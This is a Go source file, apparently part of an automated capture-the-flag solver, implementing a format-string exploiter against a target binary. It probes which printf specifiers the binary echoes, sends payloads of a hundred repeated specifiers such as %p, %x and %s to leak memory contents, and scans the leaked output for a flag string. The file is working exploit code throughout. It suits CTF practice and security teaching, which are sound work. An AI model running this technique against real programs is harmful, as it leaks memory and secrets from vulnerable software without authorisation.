package main

import (
	"fmt"
	"strings"
)

type formatStringExploiter struct{}

func NewFormatStringExploiter() *formatStringExploiter {
	return &formatStringExploiter{}
}

func (f *formatStringExploiter) FindWorkingFormatSpecifiers() []string {
	specifiers := []string{
		"%p",
		"%x",
		"%s",
		"%d",
		"%i",
		"%u",
		"%c",
		"%n",
		"%h",
		"%l",
		"%f",
		"%e",
		"%g",
		"%a",
		"%m",
		"%t",
	}

	validSpecifiers := []string{}

	for _, specifier := range specifiers {
		cmd := NewCMD(globalScope.binaryPath)
		output := cmd.Send([]byte(specifier))
		if strings.Contains(string(output), globalScope.flags[SUCCESS_STRING]) {
			validSpecifiers = append(validSpecifiers, specifier)
		}
		cmd.Stop()

	}
	fmt.Print("Valid specifiers: ")
	for _, specifier := range validSpecifiers {
		fmt.Print(specifier)
		fmt.Print(", ")

	}
	fmt.Print("\n")
	return validSpecifiers

}

func (f *formatStringExploiter) ExtractDataFromFormatSpecifiers(specifiers []string) map[string]string {
	mapSpecifiers := map[string]string{}
	amountOfSpecifiers := 100
	for _, specifier := range specifiers {
		payload := fmt.Sprintf("...%s...", strings.Repeat(specifier+".", amountOfSpecifiers))

		cmd := NewCMD(globalScope.binaryPath)
		defer cmd.Stop()

		output := string(cmd.Send([]byte(payload)))
		chunks := strings.Split(output, "...")
		if len(chunks) < 2 {
			continue
		}
		usefulOutput := chunks[1]
		mapSpecifiers[specifier] = usefulOutput
	}
	return mapSpecifiers
}

func (f *formatStringExploiter) Exploit() bool {
	specifiers := f.FindWorkingFormatSpecifiers()
	data := f.ExtractDataFromFormatSpecifiers(specifiers)
	readableData := ExtractFlagFromData(data)

	possibleFlags := []string{}
	for _, d := range readableData {
		possibleFlags = append(possibleFlags, strings.Join(d, ""))
	}

	fmt.Println("Possible flags:")
	for _, possibleFlag := range possibleFlags {
		fmt.Println(possibleFlag)
		flag := ExtractFlag(possibleFlag)
		if flag != "" {
			fmt.Println("Flag found: ", flag)
			return true
		}

	}
	fmt.Println("No flag found")

	return false
}
